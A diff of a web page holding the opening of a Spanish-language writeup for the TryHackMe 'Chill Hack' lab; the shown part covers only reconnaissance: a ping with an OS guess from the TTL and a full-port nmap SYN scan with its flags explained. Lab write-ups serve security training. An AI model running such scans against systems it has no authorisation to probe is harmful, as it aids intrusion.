-            </li>
-            <li><a href="#root">Root</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-</div>
-
-		</nav>
-		<main class="docs-content col-lg-11 col-xl-9">
-		
-				<nav aria-label="breadcrumb">
-					<ol class="breadcrumb">
-						<li class="breadcrumb-item"><a href="/">Home</a></li>
-<li class="breadcrumb-item"><a href="/writeups/">Writeups</a></li>
-<li class="breadcrumb-item"><a href="/writeups/tryhackme/">TryHackMe</a></li>
-<li class="breadcrumb-item active" aria-current="page">Chill Hack</li>
-					</ol>
-				</nav>
-			
-			<h1>Chill Hack</h1>
-			
-			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
-				<details>
-    <summary>On this page</summary>
-    <div class="page-links">
-      <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#reconocimiento">Reconocimiento</a>
-          <ul>
-            <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
-          </ul>
-        </li>
-        <li><a href="#ftp">FTP</a></li>
-        <li><a href="#http">HTTP</a>
-          <ul>
-            <li><a href="#subdirectorios">Subdirectorios</a></li>
-            <li><a href="#intrusión">Intrusión</a></li>
-          </ul>
-        </li>
-        <li><a href="#tratamiento-de-la-tty">Tratamiento de la tty</a></li>
-        <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
-          <ul>
-            <li><a href="#apaar">Apaar</a></li>
-            <li><a href="#anurodh">Anurodh</a>
-              <ul>
-                <li><a href="#mysql-rabbit-hole">mysql (rabbit hole)</a></li>
-                <li><a href="#steganography">Steganography</a></li>
-              </ul>
-            </li>
-            <li><a href="#root">Root</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-    </div>
-  </details>
-
-			</nav>
-			<p>https://tryhackme.com/room/chillhack</p>
-<p>IP Atacante = 10.10.10.10</p>
-<p>IP víctima = 10.10.11.182</p>
-<h2 id="reconocimiento">Reconocimiento<a href="#reconocimiento" class="anchor" aria-hidden="true">#</a> </h2>
-<p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ping -c <span class="m">1</span> 10.10.11.182
-</span></span><span class="line"><span class="cl">PING 10.10.11.182 <span class="o">(</span>10.10.11.182<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.11.182: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">61</span> <span class="nv">time</span><span class="o">=</span><span class="m">558</span> ms
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">--- 10.10.11.182 ping statistics ---
-</span></span><span class="line"><span class="cl"><span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
-</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 558.208/558.208/558.208/0.000 ms
-</span></span></code></pre></div><p>En este caso da un ttl (time to live) de <strong>61</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
-<h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)<a href="#escaneo-de-puertos-nmap" class="anchor" aria-hidden="true">#</a> </h3>
-<p>Ahora empezamos con un escaneo de puertos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -Pn -vvv 10.10.11.182 -oG allPorts
-</span></span></code></pre></div><table>
-<thead>
-<tr>
-<th>Parámetro</th>
-<th>Función</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>-p-</td>
-<td>Para que el escaneo sea a todos los puertos (65536)</td>
-</tr>
-<tr>
-<td>&ndash;open</td>
-<td>Para que solo reporte los puertos abiertos</td>
-</tr>
-<tr>
-<td>&ndash;min-rate 5000</td>
-<td>Definir el tiempo del escaneo</td>
-</tr>
-<tr>
-<td>-n</td>
-<td>Omitir resolución DNS</td>
-</tr>
-<tr>
-<td>-vvv</td>
-<td>Para que vaya reportando lo que encuentre por consola</td>
-</tr>
-<tr>
-<td>-Pn</td>
-<td>Skip host discovery</td>
-</tr>
-<tr>
-<td>-oG allPorts</td>
-<td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td>
-</tr>
-</tbody>
-</table>
-<p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p>
-<p><a href="https://pastebin.com/tYpwpauW">Función extractPorts</a> de <a href="https://s4vitar.github.io">@s4vitar</a></p>
-<pre tabindex="0"><code>$ extractPorts allPorts
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3b0o","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/tryhackme/","name":"Try Hack Me","position":3},{"@type":"ListItem","name":"Chill Hack","position":4}]}</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3b0o</a>
+<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
+<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
+HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=true>
+TryHackMe</button><div class="collapse show" id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded active" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
+HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3b0o</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/writeups/hackthebox/toolbox/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
+<button id=buttonColorMode class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type=button aria-label="Toggle theme"><svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/></svg><svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-4 0a4 4 0 108 0 4 4 0 10-8 0m-5 0h1m8-9v1m8 8h1m-9 8v1M5.6 5.6l.7.7m12.1-.7-.7.7m0 11.4.7.7m-12.1-.7-.7.7"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
+<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class=content>Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
+HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=true>
+TryHackMe</button><div class="collapse show" id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded active" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
+HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos-nmap>Escaneo de puertos (nmap)</a></li></ul></li><li><a href=#ftp>FTP</a></li><li><a href=#http>HTTP</a><ul><li><a href=#subdirectorios>Subdirectorios</a></li><li><a href=#intrusión>Intrusión</a></li></ul></li><li><a href=#tratamiento-de-la-tty>Tratamiento de la tty</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#apaar>Apaar</a></li><li><a href=#anurodh>Anurodh</a><ul><li><a href=#mysql-rabbit-hole>mysql (rabbit hole)</a></li><li><a href=#steganography>Steganography</a></li></ul></li><li><a href=#root>Root</a></li></ul></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/tryhackme/>TryHackMe</a></li><li class="breadcrumb-item active" aria-current=page>Chill Hack</li></ol></nav><h1>Chill Hack</h1><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos-nmap>Escaneo de puertos (nmap)</a></li></ul></li><li><a href=#ftp>FTP</a></li><li><a href=#http>HTTP</a><ul><li><a href=#subdirectorios>Subdirectorios</a></li><li><a href=#intrusión>Intrusión</a></li></ul></li><li><a href=#tratamiento-de-la-tty>Tratamiento de la tty</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#apaar>Apaar</a></li><li><a href=#anurodh>Anurodh</a><ul><li><a href=#mysql-rabbit-hole>mysql (rabbit hole)</a></li><li><a href=#steganography>Steganography</a></li></ul></li><li><a href=#root>Root</a></li></ul></li></ul></li></ul></nav></div></details></nav><p>https://tryhackme.com/room/chillhack</p><p>IP Atacante = 10.10.10.10</p><p>IP víctima = 10.10.11.182</p><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ping -c <span class=m>1</span> 10.10.11.182
+</span></span><span class=line><span class=cl>PING 10.10.11.182 <span class=o>(</span>10.10.11.182<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
+</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.11.182: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>61</span> <span class=nv>time</span><span class=o>=</span><span class=m>558</span> ms
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--- 10.10.11.182 ping statistics ---
+</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
+</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 558.208/558.208/558.208/0.000 ms
+</span></span></code></pre></div><p>En este caso da un ttl (time to live) de <strong>61</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p><h3 id=escaneo-de-puertos-nmap>Escaneo de puertos (nmap)<a href=#escaneo-de-puertos-nmap class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -p- --open -sS --min-rate <span class=m>5000</span> -n -Pn -vvv 10.10.11.182 -oG allPorts
+</span></span></code></pre></div><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Skip host discovery</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>$ extractPorts allPorts
 ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: extractPorts.tmp
 ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
